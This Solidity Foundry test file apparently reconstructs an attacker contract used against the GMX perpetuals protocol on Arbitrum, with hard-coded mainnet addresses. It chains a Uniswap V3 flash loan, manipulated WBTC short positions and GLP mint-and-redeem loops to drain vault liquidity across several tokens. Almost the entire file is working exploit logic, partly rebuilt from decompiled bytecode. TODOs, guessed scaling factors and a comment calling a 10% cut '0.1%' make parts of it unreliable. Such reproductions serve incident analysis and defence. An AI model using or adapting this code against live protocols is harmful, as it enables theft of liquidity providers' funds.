// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IVault, IVaultUtils} from "./IVault.sol";
import {IOrderBook} from "./IOrderBook.sol";
import {IRouter} from "./IRouter.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {IUniswapV3Pair} from "../../utils/IUniswapV3Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IRewardRouterV2} from "./IRewardRouterV2.sol";
import {IGlpManager} from "./IGlpManager.sol";

import {IPositionRouter} from "./IPositionRouter.sol";

// Attacker's Smart Contract 1
contract ExploitSC is TestHarness, TokenBalanceTracker {
    IRouter internal constant ROUTER =
        IRouter(0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064);

    IVault internal constant VAULT =
        IVault(0x489ee077994B6658eAfA855C308275EAd8097C4A);

    IOrderBook internal constant ORDER_BOOK =
        IOrderBook(0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB);

    IERC20 internal constant GLP =
        IERC20(0x4277f8F2c384827B5273592FF7CeBd9f2C1ac258);

    IERC20 internal constant USDC =
        IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);

    IUniswapV3Pair internal constant WETH_USDC_POOL =
        IUniswapV3Pair(0xC6962004f452bE9203591991D15f6b388e09E8D0);

    IGlpManager internal constant GLP_MANAGER =
        IGlpManager(0x3963FfC9dff443c2A94f21b129D429891E32ec18);

    IRewardRouterV2 internal constant REWARD_ROUTER_V2 =
        IRewardRouterV2(0xB95DB5B167D75e6d04227CfFFA61069348d271F5);

    IERC20 internal constant WBTC =
        IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);

    IWETH9 internal constant WETH =
        IWETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);

    IERC20 internal constant USDCE =
        IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);

    IERC20 internal constant LINK =
        IERC20(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4);

    IERC20 internal constant UNI =
        IERC20(0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0);

    IERC20 internal constant USDT =
        IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);

    IERC20 internal constant FRAX =
        IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);

    IERC20 internal constant DAI =
        IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);

    IPositionRouter internal constant POSITION_ROUTER =
        IPositionRouter(0xb87a436B93fFE9D75c5cFA7bAcFff96430b09868);

    // Array of tokens
    address[] internal tokens = [
        address(WBTC),
        address(WETH),
        address(USDCE),
        address(LINK),
        address(UNI),
        address(USDT),
        address(FRAX),
        address(DAI)
    ];

    uint8[] internal tokenDecimals = [
        8, // WBTC
        18, // WETH
        6, // USDCE
        18, // LINK
        18, // UNI
        6, // USDT
        18, // FRAX
        18 // DAI
    ];

    function createIncreaseOrder() external payable {
        ROUTER.approvePlugin(address(ORDER_BOOK));

        // TODO: Check what this is used for
        // uint256 minPrice = VAULT.getMinPrice(address(WETH));

        address[] memory path = new address[](1);
        path[0] = address(WETH);

        ORDER_BOOK.createIncreaseOrder{value: 0.1003 ether}(
            path,
            100000000000000000,
            address(WETH),
            0,
            531064000000000000000000000000000,
            address(WETH),
            true,
            1500000000000000000000000000000000,
            true,
            300000000000000,
            true
        );
    }

    function createDecreaseOrder() external payable {
        ROUTER.approvePlugin(address(ORDER_BOOK));

        // TODO: Check what this is used for
        // IVault.Position memory position = VAULT.getPosition(
        //     address(this),
        //     address(WETH),
        //     address(WETH),
        //     true
        // );

        ORDER_BOOK.createDecreaseOrder{value: 0.0003 ether}(
            address(WETH),
            53106400000000000000000000000000,
            address(WETH),
            26517133600000000000000000000000,
            true,
            1500000000000000000000000000000000,
            true
        );
    }

    receive() external payable {
        // 1913705482286167437447414747675542
        uint256 wbtcGlobalShortAveragePrice = GLP_MANAGER
            .getGlobalShortAveragePrice(address(WBTC));

        // 109500940000000000000000000000000000
        uint256 wbtcMaxPrice = VAULT.getMaxPrice(address(WBTC));

        require(
            wbtcMaxPrice > wbtcGlobalShortAveragePrice,
            "Max price is not greater than global short average price"
        );

        if (wbtcMaxPrice / wbtcGlobalShortAveragePrice > 50) {
            console2.log(
                "Max price is more than 50 times greater than global short average price"
            );

            // 27855857410
            uint256 usdcReserveAmount = VAULT.reservedAmounts(address(USDC));

            // 10013532053118
            uint256 usdcPoolAmount = VAULT.poolAmounts(address(USDC));

            // 10013364877641887807943993
            uint256 usdcUsdgAmount = VAULT.usdgAmounts(address(USDC));

            // 16898185277151228065200623
            uint256 usdcMaxUsdgAmount = VAULT.maxUsdgAmounts(address(USDC));

            // v5, /* uint256 */ v6 = stor_6_0_19.reservedAmounts(stor_10_0_19).gas(msg.gas);
            // require(bool(v5), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
            // MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0);
            // require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
            // v7, /* uint256 */ v8 = stor_6_0_19.poolAmounts(stor_10_0_19).gas(msg.gas);
            // require(bool(v7), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
            // MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0);
            // require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
            // v9 = _SafeSub(v8, v6);
            // v10 = _SafeDiv(v9, 10);
            // v11, /* uint256 */ v12 = stor_6_0_19.usdgAmounts(stor_10_0_19).gas(msg.gas);
            // require(bool(v11), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
            // MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0);
            // require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
            // v13, /* uint256 */ v14 = stor_6_0_19.maxUsdgAmounts(stor_10_0_19).gas(msg.gas);
            // require(bool(v13), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
            // MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0);
            // require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
            // v15 = _SafeSub(v14, v12);
            // v16 = _SafeDiv(v15, 10 ** 12);
            // v17 = _SafeDiv(v16, 10 ** 12);
            // v18 = _SafeMul(v17, 10 ** 12);
            // v19 = _SafeMul(v18, 9);
            // v20 = _SafeDiv(v19, 100);
            // v21 = _SafeAdd(v10, v20);
            // v22 = _SafeAdd(v21, v18);

            // uint256 availableAmountUsdc = usdcPoolAmount - usdcReserveAmount;//v8-v6
            // uint256 availableUsdcUsdgAmount = usdcMaxUsdgAmount - usdcUsdgAmount;//v14-v12
            // uint256 amount1Calc = availableAmountUsdc / 10 + availableUsdcUsdgAmount * 9 / 10**14 + availableUsdcUsdgAmount / 10**12;

            uint256 amount0 = 0;
            uint256 amount1 = 7538567619570;

            // Data value seems like was calculated before and are already in memory
            // data = [uint256,uint256]

            // value1 = 0x16639c6c3f2 = 1538567619570
            // value2 = 0x574fbde6000 = 6000000000000

            bytes
                memory data = hex"0000000000000000000000000000000000000000000000000000016639c6c3f200000000000000000000000000000000000000000000000000000574fbde6000";

            WETH_USDC_POOL.flash(address(this), amount0, amount1, data);
        } else {
            console2.log(
                "Max price is not more than 50 times greater than global short average price"
            );

            uint256 usdcBalance = USDC.balanceOf(address(this));
            USDC.transfer(
                address(VAULT),
                usdcBalance
            );

            uint256 maxPrice = VAULT.getMaxPrice(address(USDC));

            // Not sure why the scaling factor 30 is here. Maybe adjusting precision?
            uint256 sizeDelta = (maxPrice * usdcBalance * 30) / (10 ** 6);
            
            VAULT.increasePosition(
                address(this),
                address(USDC),
                address(WBTC),
                sizeDelta,
                false
            );

            IVault.Position memory position = VAULT.getPosition(
                address(this),
                address(USDC),
                address(WBTC),
                false
            );

            ROUTER.approvePlugin(address(POSITION_ROUTER));

            address[] memory path = new address[](1);
            path[0] = address(USDC);

            POSITION_ROUTER.createDecreasePosition{value: 3000000000000000}(
                path,
                address(WBTC),
                0, // collateralDelta
                position.size, // sizeDelta
                false, // isLong
                address(this), // receiver
                120000000000000000000000000000000000, // acceptablePrice
                0, // minOut
                3000000000000000, // executionFee
                false, // withdrawETH
                address(this) // callbackTarget
            );
        }
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        //Decode data as 2 uint256 values
        (uint256 value1, uint256 value2) = abi.decode(data, (uint256, uint256));

        // Approve USDC to GLP manager
        USDC.approve(address(GLP_MANAGER), value2);

        REWARD_ROUTER_V2.mintAndStakeGlp(address(USDC), value2, 0, 0);

        USDC.transfer(address(VAULT), value1);

        uint256 maxPrice = VAULT.getMaxPrice(address(USDC));

        // Not sure why the scaling factor 10 is here. Maybe adjusting precision?
        uint256 sizeDelta = (maxPrice * value1 * 10) / (10 ** 6);

        VAULT.increasePosition(
            address(this),
            address(USDC),
            address(WBTC),
            sizeDelta,
            false
        );

        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = IERC20(tokens[i]);
            console2.log("Token:", address(token));
            uint256 tokenDecimal = tokenDecimals[i];
            uint256 aum = GLP_MANAGER.getAum(false);
            uint256 glpTotalSupply = GLP.totalSupply();
            uint256 reservedAmount = VAULT.reservedAmounts(address(token));
            uint256 poolAmount = VAULT.poolAmounts(address(token));
            uint256 tokenMinPrice = VAULT.getMinPrice(address(token));

            // console2.log("Token:", address(token));
            // console2.log("Token Decimal:", tokenDecimal);
            // console2.log("AUM:", aum);
            // console2.log("GLP Total Supply:", glpTotalSupply);
            // console2.log("Reserved Amount:", reservedAmount);
            // console2.log("Pool Amount:", poolAmount);
            // console2.log("Token Min Price:", tokenMinPrice);

            // Calculate the value of the 'available' token amount in a normalized format (e.g., USD equivalent)
            // (poolAmount - reservedAmount) gives the truly available liquidity for the token.
            // Multiplying by tokenMinPrice and dividing by 10^tokenDecimal converts this into a standard value unit,
            // effectively removing the token's specific decimal scaling.
            uint256 availableTokenValueNormalized = (tokenMinPrice *
                (poolAmount - reservedAmount)) / (10 ** tokenDecimal);

            // Apply a small cut (0.1%) to the calculated value
            uint256 adjustedAvailableTokenValue = (availableTokenValueNormalized *
                    900) / 1000;

            // Calculate the amount of GLP tokens that corresponds to the adjusted available token value.
            // This uses the standard GMX formula: (AssetValue / AUM) * GLP_TotalSupply = Redeemable GLP Amount
            uint256 glpAmountToRedeem = (adjustedAvailableTokenValue *
                glpTotalSupply) / aum;

            console2.log(
                "Available Token Value (Normalized):",
                availableTokenValueNormalized
            );
            console2.log(
                "Adjusted Available Token Value:",
                adjustedAvailableTokenValue
            );
            console2.log("GLP Amount to Redeem:", glpAmountToRedeem);

            REWARD_ROUTER_V2.unstakeAndRedeemGlp(
                address(token),
                glpAmountToRedeem,
                0,
                address(this)
            );
        }

        //TODO: Continue with decompiled contract after while

        IVault.Position memory position = VAULT.getPosition(
            address(this),
            address(USDC),
            address(WBTC),
            false
        );

        VAULT.decreasePosition(
            address(this),
            address(USDC),
            address(WBTC),
            0,
            position.size,
            false,
            address(this)
        );

        FRAX.approve(
            address(GLP_MANAGER),
            9000000000000000000000000
        );

        REWARD_ROUTER_V2.mintAndStakeGlp(
            address(FRAX),
            9000000000000000000000000,
            0,
            0
        );

        USDC.transfer(
            address(VAULT),
            500000000000
        );

        uint256 usdcMaxPrice = VAULT.getMaxPrice(address(USDC));
        sizeDelta = (usdcMaxPrice * 500000000000 * 25) / (10 ** 6);
        
        VAULT.increasePosition(
            address(this),
            address(USDC),
            address(WBTC),
            sizeDelta,
            false
        );

        uint256 aum = GLP_MANAGER.getAum(false);
        uint256 glpTotalSupply = GLP.totalSupply();
        uint256 reservedAmount = VAULT.reservedAmounts(address(FRAX));
        uint256 poolAmount = VAULT.poolAmounts(address(FRAX));

        uint256 glpAmount = (poolAmount - reservedAmount) * 10**12 * 999 / 1000 * glpTotalSupply / aum;
        
        REWARD_ROUTER_V2.unstakeAndRedeemGlp(
            address(FRAX),
            glpAmount,
            0,
            address(this)
        );

        position = VAULT.getPosition(
            address(this),
            address(USDC),
            address(WBTC),
            false
        );

        VAULT.decreasePosition(
            address(this),
            address(USDC),
            address(WBTC),
            0,
            position.size,
            false,
            address(this)
        );

        FRAX.approve(
            address(GLP_MANAGER),
            9000000000000000000000000
        );

        REWARD_ROUTER_V2.mintAndStakeGlp(
            address(FRAX),
            9000000000000000000000000,
            0,
            0
        );

        USDC.transfer(
            address(VAULT),
            500000000000
        );

        usdcMaxPrice = VAULT.getMaxPrice(address(USDC));
        sizeDelta = (usdcMaxPrice * 500000000000 * 25) / (10 ** 6);
        VAULT.increasePosition(
            address(this),
            address(USDC),
            address(WBTC),
            sizeDelta,
            false
        );

        aum = GLP_MANAGER.getAum(false);
        glpTotalSupply = GLP.totalSupply();
        reservedAmount = VAULT.reservedAmounts(address(FRAX));
        poolAmount = VAULT.poolAmounts(address(FRAX));

        glpAmount = (poolAmount - reservedAmount) * 10**12 * 999 / 1000 * glpTotalSupply / aum;
        
        REWARD_ROUTER_V2.unstakeAndRedeemGlp(
            address(FRAX),
            glpAmount,
            0,
            address(this)
        );

        //--------
        position = VAULT.getPosition(
            address(this),
            address(USDC),
            address(WBTC),
            false
        );
        
        VAULT.decreasePosition(
            address(this),
            address(USDC),
            address(WBTC),
            0,
            position.size,
            false,
            address(this)
        );

        FRAX.approve(
            address(GLP_MANAGER),
            400000000000000000000000
        );

        REWARD_ROUTER_V2.mintAndStakeGlp(
            address(FRAX),
            400000000000000000000000,
            0,
            0
        );

        FRAX.transfer(
            address(VAULT),
            10 ** 22
        );

        maxPrice = VAULT.getMaxPrice(address(FRAX));
        sizeDelta = (maxPrice * (10 ** 22) * 38) / (10 ** 18);
        
        // Error 29 Vault: insufficient collateral for fees


        VAULT.increasePosition(
            address(this),
            address(FRAX),
            address(WBTC),
            sizeDelta,
            false
        );

        //--------

        aum = GLP_MANAGER.getAum(false);
        glpTotalSupply = GLP.totalSupply();
        reservedAmount = VAULT.reservedAmounts(address(USDC));
        poolAmount = VAULT.poolAmounts(address(USDC));

        glpAmount = (poolAmount - reservedAmount) * 10**24 * 999 / 1000 * glpTotalSupply / aum;

        REWARD_ROUTER_V2.unstakeAndRedeemGlp(
            address(USDC),
            glpAmount,
            0,
            address(this)
        );

        position = VAULT.getPosition(
            address(this),
            address(FRAX),
            address(WBTC),
            false
        );

        VAULT.decreasePosition(
            address(this),
            address(FRAX),
            address(WBTC),
            0,
            position.size,
            false,
            address(this)
        );

        // Log balance of all assets in the exploit contract
        console2.log("WBTC Balance:",  WBTC.balanceOf(address(this)));
        console2.log("USDC Balance:", USDC.balanceOf(address(this)));
        console2.log("WETH Balance:", WETH.balanceOf(address(this)));
        console2.log("GLP Balance:", GLP.balanceOf(address(this)));
        console2.log("USDCE Balance:", USDCE.balanceOf(address(this)));
        console2.log("LINK Balance:", LINK.balanceOf(address(this)));
        console2.log("UNI Balance:", UNI.balanceOf(address(this)));
        console2.log("USDT Balance:", USDT.balanceOf(address(this)));
        console2.log("FRAX Balance:", FRAX.balanceOf(address(this)));
        console2.log("DAI Balance:", DAI.balanceOf(address(this)));
       
        console2.log("Fee1:", fee1);
        console2.log("Value1:", value1);
        console2.log("Value2:", value2);
        // Repay the flashloan
        USDC.transfer(msg.sender, value1 + value2 + fee1);
    }

    function gmxPositionCallback(bytes32 positionKey, bool isExecuted, bool isIncrease) external{
        require(msg.sender == address(POSITION_ROUTER), "Unauthorized callback");

        ORDER_BOOK.createDecreaseOrder{value: 3000000000000000}(
            address(WETH),
            53106400000000000000000000000000,
            address(WETH),
            26517133600000000000000000000000,
            true,
            1500000000000000000000000000000000,
            true
        );
    }
}

// 1538567619570
// 6000000000000
// 3769283810
// 2009066716